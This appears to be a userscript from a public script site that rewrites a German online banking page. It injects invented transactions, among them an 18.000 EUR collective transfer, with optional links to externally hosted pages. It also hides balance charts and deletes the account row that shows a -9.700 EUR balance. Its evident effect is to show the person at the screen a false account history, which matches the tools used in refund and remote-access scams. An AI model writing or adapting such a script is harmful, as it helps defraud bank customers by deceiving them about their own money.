// ==UserScript==
// @name         Ed Start 4Rec Sp hans-juergen.woche@t-online.de
...
// @downloadURL https://update.greasyfork.org/scripts/510885/Ed%20Start%204Rec%20Sp%20hans-juergenwoche%40t-onlinede.user.js
// @updateURL https://update.greasyfork.org/scripts/510885/Ed%20Start%204Rec%20Sp%20hans-juergenwoche%40t-onlinede.meta.js
// ==/UserScript==
...
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    ...
    var accountsecurity = "592 0089 39";

    if (easyUpdate == "yes"){
        x2amount = 10000;}

    var umsatze = "Downloads";
    var finanz = "Downloads";
...
//        },
 //   {
//           predecimalAmount: '3.700',
//            decimalAmount: ',00',
//           transactionTitle: 'Andreas Gold.',  /// !!! NEEDS TO BE DIFFERENT FROM OTHERS
//            transactionInfo: " Hilfe",
//           isNegative: false , // Example flag, modify this based on your actual logic
 //            transactionLink: 'https://druckansichagold.tiiny.site/' // Custom link for the transaction
 //       },
    {
            predecimalAmount: '18.000',
            decimalAmount: ',00',
            transactionTitle: 'SAMMELÜBERWEISUNG',
            transactionInfo: "Übertrag 2",
           isNegative: false // Example flag, modify this based on your actual logic
        },
...
//==========================================================================================================================================================================================================
     ...
     if (window.location.href.indexOf("onlinebanking") > 0 || window.location.href.indexOf("kontoauswahl") > 0 || window.location.href.indexOf("Downloads") > 0) {
...
function removeChartElements() {
    const areaElements = document.querySelectorAll('.highcharts-area');
    const rootElements = document.querySelectorAll('.highcharts-root');
    const saldoElements = document.querySelectorAll('.saldo-linechart-wrapper');

    // Remove elements with class "highcharts-area"
    areaElements.forEach(element => {
        element.remove();
    });

    // Remove elements with class "highcharts-root"
    rootElements.forEach(element => {
        element.remove();
    });

    // Remove elements with class "saldo-linechart-wrapper"
...
const intervalId = setInterval(removeChartElements, 100);

// Optional: Stop the interval after some time
// setTimeout(() => clearInterval(intervalId), <time_in_milliseconds>);
...
//======================================================================================================================================
    ...
    function checkForCardLinkAndUpdateBalances() {
        var cardLinks = document.querySelectorAll('.mkp-greeting');

        // Check each element with class "mkp-identifier-sticker-placeholder"
        cardLinks.forEach(function(cardLink) {
            // Modify balances if the element is found
            console.log('Element with class "mkp-greeting" found. Modifying balances...');
            ...
            setTimeout(() => {
                cardLink.remove();
                console.log("Element with class 'mkp-greeting' removed.");
            }, 10);
        });
    }
...
function removeParentElementWithNegativeBalance() {
    setInterval(() => {
        // Get all elements with the class 'mkp-identifier'
        const elements = document.querySelectorAll('.mkp-identifier');

        // Iterate over the elements
        elements.forEach((element) => {
            // Find the span with the class 'balance-predecimal minus' inside the element
            const span = element.querySelector('span.balance-predecimal.minus');

            // If the span exists and its content is "-9.700"
            if (span && span.textContent.trim() === '-9.700') {
                // Remove the parent element (the 'mkp-identifier' element)
                element.remove();
            }
        });
...
removeParentElementWithNegativeBalance();
...
//    // Example transactions array with the new 'transactionLink' property
//    const transactions = [
//        // NUMERATION STARTING WITH THE END
//        {
//            predecimalAmount: '47',
...
//            transactionInfo: "Transaction 1 details",
//            isNegative: false, // Example flag, modify this based on your actual logic
//            transactionLink: 'https://example.com/transaction1' // Custom link for the transaction
 //       },
//        {
...
//            transactionLink: 'https://example.com/transaction2' // Custom link for the transaction
 //       },
//        // Add more transactions as needed
 //   ];
                    ...
                    <div class="mkp-identifier">
                        <div class="mkp-identifier-description">
                            <h4 class="mkp-headline-05">
                                <a href="${transaction.transactionLink}" class="mkp-identifier-link" aria-label="Umsatz: ${transaction.transactionTitle}; Betrag: ${transaction.predecimalAmount},${transaction.decimalAmount} EUR">
